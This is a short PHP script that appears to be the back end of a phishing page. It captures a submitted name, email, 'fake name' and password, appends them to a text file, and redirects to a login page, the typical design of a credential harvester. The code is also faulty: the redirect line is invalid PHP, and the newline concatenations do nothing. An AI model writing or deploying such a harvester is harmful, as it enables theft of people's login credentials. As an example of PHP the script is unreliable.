<?php
$document = fopen("document_pass.txt", "a+");
$your_name = $_POST["name"];
$your_mail = $_POST["email"];
$your_fake_name = $_POST["fake_name"];
$your_pass = $_POST["ssap"];
fwrite($document, $your_name) . "\n";
fwrite($document, $your_mail) . "\n";
fwrite($document, $your_fake_name) . "\n";
fwrite($document, $your_pass) . "\n";

fclose($document);

header = "Location: /login.html"
?>
